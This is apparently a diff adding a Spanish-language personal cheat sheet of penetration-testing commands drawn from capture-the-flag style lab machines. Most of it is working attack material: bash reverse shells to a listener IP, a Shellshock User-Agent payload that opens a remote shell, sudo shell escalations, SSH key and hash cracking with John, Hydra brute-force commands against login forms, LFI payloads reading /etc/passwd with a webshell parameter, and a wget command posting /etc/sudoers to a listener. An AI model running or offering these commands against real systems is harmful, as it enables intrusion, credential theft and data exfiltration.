@@ -1,0 +1,145 @@
+<p>lista de comandos para recordar</p>
+
+<p><img src="/assets/images/bob.png" alt="" /></p>
+
+<p>##Herramientas usadas</p>
+
+<p>-ESTE ARCHIVO SOLO ES PARA PONER FUNCIONES QUE PUEDEN SERVIR A FUTURO COMO COMANDO O HERRAMIENTAS</p>
+
+<hr />
+<p>##reverse shell en bash
+bash -i &gt;&amp; /de/tcp/10.10.10.10/443 0&gt;&amp;1
+#o en caso de que falle es con
+bash -c “bash -i &gt;%26 /dev/tcp/10.10.10.10/443 0&gt;%261”</p>
+
+<p>##telnet—-
+para conectarse a telnet es con los siguientes comandos y funciona para puertos como 110 y 143
+ telnet 10.10.10.10 110
+ #para listar archivos
+LIST
+#para leer un archivo
+RETR
+—–</p>
+
+<p>##identificar encriptados
+Para decifrar encriptados podemos intentar con esta pagina que sirve para localizar el tipo
+http://web.archive.org/web/20120624074941/http://home.comcast.net/~acabion/refscore.html</p>
+
+<p>##para hacer fuerza bruta a hashes de idrsa u otros usamos johnthe ripper</p>
+
+<p>primero pasamos el idrsa a hash con un script de python que esta en github
+https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py
+#para ejecutarlo es con python exploit.py idrsa</p>
+
+<p>python sshjohn.py idrsa &gt; hash.hash</p>
+
+<p>una vez en hash lo rompemos con john
+john hash.hash –wordlist=password.txt
+#para entrar a ssh con la clave es con 
+ssh orestis@10.10.10.17 -i id_rsa
+y ponemos la contrasena</p>
+
+<p>##para la escalada de privilegios usando pkexec y este exploit 
+https://github.com/ly4k/PwnKit</p>
+
+<p>##Shellshock attack
+para la maquina shocker explotamos shellshock en donde veamos que tiene un directorio cgi-bin podemos intentar explotarlo
+para explotar un shellshock debemos abusar de el user agent con este comando ###User-Agent: () { :; };
+lo podemos poner en un curl o en burpsuite curl -H “User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/10.10.16.6/443 0&gt;&amp;1” http://10.10.10.56/cgi-bin/user.sh</p>
+
+<p>#despues de el user agent podemos ejecutar comandos y ya podiamos enviar un reverse shell</p>
+
+<p>para la escalada de privilegios abusamos de perl con este comando
+#sudo perl -e ‘exec “/bin/sh”;’</p>
+
+<p>##cambio de usuario con privilegios root
+en la maquina bashed podemos cambiar de usuario con
+sudo -u user</p>
+
+<p>si vemos que tiene permisos root podemos obtener una shell con</p>
+
+<p>sudo -u user /bin/bash</p>
+
+<p>##escalacion con archivos ejecutables con permisos root
+ en la maquina nibbles usamos la escalacion de privilegios por medio de un script que nos daba permisos root</p>
+
+<p>pusimos un reverse shell simple en bash y lo ejecutamos como root con este comando</p>
+
+<p>sudo -u root /home/nibbler/personal/stuff/monitor.sh</p>
+
+<p>esto sucede cuando podemos ejecutar archivos sin contresena con root</p>
+
+<p>#</p>
+
+<p>(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh</p>
+
+<h2 id="esteganografia">Esteganografia</h2>
+<p>para la maquina nineveh se utilizo esteganografia y las herramientas que use fueron</p>
+
+<p>exiftool para ver si ocultaba datos adentro y
+strings para ver que datos en las cadenas ocultaba</p>
+
+<h2 id="hydra">HYDRA</h2>
+<p>para la maquina nineveh se puede acceder por fuerza bruta con hydra con el siguiente comando
+ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form “/department/login.php:username=admin&amp;password=^PASS^:Invalid Password!” -o pass.tx</p>
+
+<p>este comando es para un metodo https
+sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form “/db/index.php:password=^PASS^&amp;remember=yes&amp;login=Log+In&amp;proc_login=true:Incorrect password”</p>
+
+<p>en esta pagina vemos como hacer ataques con hydra
+https://infinitelogins.com/2020/02/22/how-to-brute-force-websites-using-hydra/</p>
+
+<p>##LFI PAYLOADS
+para probar un file inclusion podemos probar con estas rutas</p>
+
+<p>/etc/passwd     No se selecciona ninguna nota.
+../../../../../../../../../../etc/passwd        No se selecciona ninguna nota.
+ninevehNotes    Advertencia: include(files/ninevehNotes): error al abrir el flujo: no existe tal archivo o directorio en /var/www/html/department/manage.php en la línea 31
+ninevehNote     No se selecciona ninguna nota.
+files/ninevehNotes/../../../../../../../../../etc/passwd        Nombre de archivo demasiado largo.
+files/ninevehNotes/../../../../../../../etc/passwd      Los contenidos de /etc/passwd
+/ninevehNotes/../etc/passwd     Los contenidos de /etc/passwd</p>
+
+<p>##para hacer un lfi podemos intentar con la ruta si vemos una extension
+http://10.10.10.43/department/manage.php/manage.php?notes=/ninevehNotes/../var/tmp/hack.php&amp;cmd=id
+ y para activar la webshell es con
+?cmd=id
+o
+&amp;cmd=id</p>
+
+<p>##HYDRA</p>
+
+<p>hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.127.109 http-post-form “/admin/:user=admin&amp;pass=^PASS^:Username or password invalid” -o pass</p>
+
+<p>comando para hacerfuerza bruta en logins</p>
+
+<h1 id="para-hacer-fuerza-bruta-a-un-hash-con-john-debemos-copiar-completo-el-hash-y-usar-la-opcion-normalmente">para hacer fuerza bruta a un hash con john debemos copiar completo el hash y usar la opcion normalmente</h1>
+
+<h1 id="en-esta-pagina-podemos-ver-los-tipos-de-hashes-que-hay-para-crakear">en esta pagina podemos ver los tipos de hashes que hay para crakear</h1>
+
+<p>#para hacer sudo con wget podemos hacerlo con estos comandos
+sudo wget –post-file=/etc/sudoers <listener IP="">
+sudo wget http://0.0.0.0 --output-document=/ruta para mover</listener></p>
+
+<p>##ruby dependencias yalm yalm.load es un error de una dependencia de ruby que puede ser vulnerable a ejecucion de comandos en el documento yml que carga yam.load en git_set podemos introduc&gt;</p>
+
+<p>##websocket
+para explotarlo podemos con sql con sqlmap que podemos buscar un script en google y podemo ver las opciones</p>
+
+<p>##sqlmap
+–dsb enumera databases
+-D enumera la base de datos que le pasamos
+–tables enumera las tablas dentro de la base de datos
+-T enumera la tabla que le pasamos
+–colums enumera las columnas en la tabla que le pasamos
+-C enumera las columnas que le pasamos
+-dump es para obtener una copia de los datos que le pasamos</p>
+
+<p>#comandos para actualizar la pagina de github
+git add .
+git commit -m “cambio”
+git push -u origin
+poner usuario y token de github</p>
+
+<p>-</p>
+
